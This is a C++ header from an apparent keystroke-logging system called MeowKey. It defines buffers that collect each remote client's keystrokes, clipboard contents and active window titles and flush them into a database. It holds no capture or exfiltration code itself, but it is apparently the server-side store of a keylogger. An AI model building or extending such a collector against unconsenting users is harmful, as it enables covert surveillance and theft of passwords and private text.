#ifndef EVENT_BUFFERS_HPP
#define EVENT_BUFFERS_HPP

#include "db_structures.hpp"
#include "meowkey_database.hpp"
#include <vector>
#include <mutex>
#include <iostream>
#include <algorithm>

using namespace std;

// Keystroke buffer (50 events, flush at 25)
class KeystrokeBuffer {
private:
    vector<KeystrokeEvent> buffer_;
    mutable mutex mutex_;  // Changed to mutable
    uint32_t client_hash_;
    uint32_t sequence_;
    MeowKeyDatabase* db_;
    
    static constexpr size_t MAX_SIZE = 50;
    static constexpr size_t FLUSH_AT = 25;
    
public:
    KeystrokeBuffer(uint32_t client_hash, MeowKeyDatabase* db) 
        : client_hash_(client_hash), sequence_(0), db_(db) {
        buffer_.reserve(MAX_SIZE);
    }
    
    void add(uint64_t timestamp, const string& key) {
        bool should_flush = false;
        
        {
            lock_guard<mutex> lock(mutex_);
            buffer_.emplace_back(timestamp, client_hash_, sequence_++, key);
            should_flush = (buffer_.size() >= FLUSH_AT);
        }
        
        // Call flush OUTSIDE the lock to avoid deadlock
        if (should_flush) {
            flush();
        }
    }
    
    void flush() {
        lock_guard<mutex> lock(mutex_);
        
        if (buffer_.empty()) return;
        
        // Flush 50% (25 events)
        size_t flush_count = min(buffer_.size(), FLUSH_AT);
        
        cout << "  Flushing " << flush_count << " keystrokes..." << endl;
        cout.flush();
        
        for (size_t i = 0; i < flush_count; i++) {
            db_->insertKeystroke(client_hash_, buffer_[i]);
        }
        
        // Remove flushed events
        buffer_.erase(buffer_.begin(), buffer_.begin() + flush_count);
        
        cout << "  Keystroke flush completed. Buffer size: " << buffer_.size() << endl;
        cout.flush();
    }
    
    size_t size() const { 
        lock_guard<mutex> lock(mutex_);
        return buffer_.size(); 
    }
    
    bool needsFlush() const { 
        lock_guard<mutex> lock(mutex_);
        return buffer_.size() >= FLUSH_AT; 
    }
};

// Clipboard buffer (5 events, flush at 3)
class ClipboardBuffer {
private:
    vector<ClipboardEvent> buffer_;
    mutable mutex mutex_;  // Changed to mutable
    uint32_t client_hash_;
    MeowKeyDatabase* db_;
    
    static constexpr size_t MAX_SIZE = 5;
    static constexpr size_t FLUSH_AT = 3;
    
public:
    ClipboardBuffer(uint32_t client_hash, MeowKeyDatabase* db) 
        : client_hash_(client_hash), db_(db) {
        buffer_.reserve(MAX_SIZE);
    }
    
    void add(uint64_t timestamp, const string& content) {
        bool should_flush = false;
        
        {
            lock_guard<mutex> lock(mutex_);
            buffer_.emplace_back(timestamp, client_hash_, content);
            should_flush = (buffer_.size() >= FLUSH_AT);
        }
        
        if (should_flush) {
            flush();
        }
    }
    
    void flush() {
        lock_guard<mutex> lock(mutex_);
        
        if (buffer_.empty()) return;
        
        // Flush 60% (3 events)
        size_t flush_count = min(buffer_.size(), FLUSH_AT);
        
        cout << "  Flushing " << flush_count << " clipboard events..." << endl;
        cout.flush();
        
        for (size_t i = 0; i < flush_count; i++) {
            db_->insertClipboard(client_hash_, buffer_[i]);
        }
        
        buffer_.erase(buffer_.begin(), buffer_.begin() + flush_count);
        
        cout << "  Clipboard flush completed. Buffer size: " << buffer_.size() << endl;
        cout.flush();
    }
    
    size_t size() const { 
        lock_guard<mutex> lock(mutex_);
        return buffer_.size(); 
    }
    
    bool needsFlush() const { 
        lock_guard<mutex> lock(mutex_);
        return buffer_.size() >= FLUSH_AT; 
    }
};

// Window buffer (10 events, flush at 5)
class WindowBuffer {
private:
    vector<WindowEvent> buffer_;
    mutable mutex mutex_;  // Changed to mutable
    uint32_t client_hash_;
    MeowKeyDatabase* db_;
    
    static constexpr size_t MAX_SIZE = 10;
    static constexpr size_t FLUSH_AT = 5;
    
public:
    WindowBuffer(uint32_t client_hash, MeowKeyDatabase* db) 
        : client_hash_(client_hash), db_(db) {
        buffer_.reserve(MAX_SIZE);
    }
    
    void add(uint64_t timestamp, const string& title, const string& process) {
        bool should_flush = false;
        
        {
            lock_guard<mutex> lock(mutex_);
            buffer_.emplace_back(timestamp, client_hash_, title, process);
            should_flush = (buffer_.size() >= FLUSH_AT);
        }
        
        if (should_flush) {
            flush();
        }
    }
    
    void flush() {
        lock_guard<mutex> lock(mutex_);
        
        if (buffer_.empty()) return;
        
        // Flush 50% (5 events)
        size_t flush_count = min(buffer_.size(), FLUSH_AT);
        
        cout << "  Flushing " << flush_count << " window events..." << endl;
        cout.flush();
        
        for (size_t i = 0; i < flush_count; i++) {
            db_->insertWindow(client_hash_, buffer_[i]);
        }
        
        buffer_.erase(buffer_.begin(), buffer_.begin() + flush_count);
        
        cout << "  Window flush completed. Buffer size: " << buffer_.size() << endl;
        cout.flush();
    }
    
    size_t size() const { 
        lock_guard<mutex> lock(mutex_);
        return buffer_.size(); 
    }
    
    bool needsFlush() const { 
        lock_guard<mutex> lock(mutex_);
        return buffer_.size() >= FLUSH_AT; 
    }
};

// Client session with all buffers
class ClientSession {
private:
    string client_id_;
    uint32_t client_hash_;
    bool is_active_;
    
    KeystrokeBuffer keystroke_buffer_;
    ClipboardBuffer clipboard_buffer_;
    WindowBuffer window_buffer_;
    
public:
    ClientSession(const string& client_id, MeowKeyDatabase* db) 
        : client_id_(client_id), 
          client_hash_(ClientRecord::hashString(client_id)),
          is_active_(true),
          keystroke_buffer_(client_hash_, db),
          clipboard_buffer_(client_hash_, db),
          window_buffer_(client_hash_, db) {}
    
    void addKeystroke(uint64_t timestamp, const string& key) {
        keystroke_buffer_.add(timestamp, key);
    }
    
    void addClipboard(uint64_t timestamp, const string& content) {
        clipboard_buffer_.add(timestamp, content);
    }
    
    void addWindow(uint64_t timestamp, const string& title, const string& process) {
        window_buffer_.add(timestamp, title, process);
    }
     bool needsKeystrokeFlush() const {
        // Check through keystroke_buffer_
        return keystroke_buffer_.needsFlush();
    }
    
    bool needsClipboardFlush() const {
        return clipboard_buffer_.needsFlush();
    }
    
    bool needsWindowFlush() const {
        return window_buffer_.needsFlush();
    }
    
    void flushKeystrokes() {
        keystroke_buffer_.flush();
    }
    
    void flushClipboard() {
        clipboard_buffer_.flush();
    }
    
    void flushWindows() {
        window_buffer_.flush();
    }
    void flushAll() {
        cout << "Flushing all buffers for client: " << client_id_ << endl;
        cout.flush();
        keystroke_buffer_.flush();
        clipboard_buffer_.flush();
        window_buffer_.flush();
        cout << "All buffers flushed for client: " << client_id_ << endl;
        cout.flush();
    }
    
    const string& getClientId() const { return client_id_; }
    uint32_t getClientHash() const { return client_hash_; }
    bool isActive() const { return is_active_; }
    void setActive(bool active) { is_active_ = active; }
    
    void printBufferStatus() const {
        cout << "Client: " << client_id_ << endl;
        cout << "  Keystrokes: " << keystroke_buffer_.size() << "/50" << endl;
        cout << "  Clipboard: " << clipboard_buffer_.size() << "/5" << endl;
        cout << "  Windows: " << window_buffer_.size() << "/10" << endl;
        cout.flush();
    }
};

#endif